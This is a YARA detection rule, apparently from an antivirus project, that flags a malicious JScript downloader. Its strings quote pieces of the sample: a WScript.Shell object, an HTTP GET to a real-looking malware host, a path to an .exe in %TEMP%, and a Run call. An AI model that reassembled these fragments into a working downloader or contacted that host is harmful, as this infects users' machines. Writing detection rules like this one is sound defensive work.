rule sig_20160330_91b5d50a4790c0b38f4a385bdc5fe0ac {
  meta:
    description = "datamaliciousorder - file 20160330_91b5d50a4790c0b38f4a385bdc5fe0ac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1f1e90137d29000659db64e87ed63630377ea6ea3b85dad560f4d5cb39ccfbec"

  strings:
    $s1  = "var M = function A() {return WScript[ZY](\"WScript\"+\".Shell\");}(), QL = 11;" fullword ascii
    $s2  = "BI[HS](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s3  = "function BY(C, A1){S = S * 1; return C - A1;};" fullword ascii
    $s4  = "if (BI[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function L(){return Z1 + \"\";};" fullword ascii
    $s6  = "function CG() {return M[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7NK5A3z0O1rt.ex\" + \"e\";};" fullword ascii
    $s7  = "function N() {return ((VR == true) && (VR == N0)) ? 1 : S;};" fullword ascii
    $s8  = "function PG(YZ){M[\"Run\"](YZ, S, S);};" fullword ascii
    $s9  = "var Y = new this[\"Date\"]();" fullword ascii
    $s10 = "function Q(){return 22;};" fullword ascii
    $s11 = "}while (O);" fullword ascii
    $s12 = "function KN(A0) {var OJ = (1, 2, 3, 4, 5, A0); return OJ;};" fullword ascii
    $s13 = "return BY(PP, D);" fullword ascii
    $s14 = "function Z(){return ZY;};" fullword ascii
    $s15 = "function AR()" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "var Y0 = false;" fullword ascii
    $s19 = "var VR = false;" fullword ascii
    $s20 = "VR = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}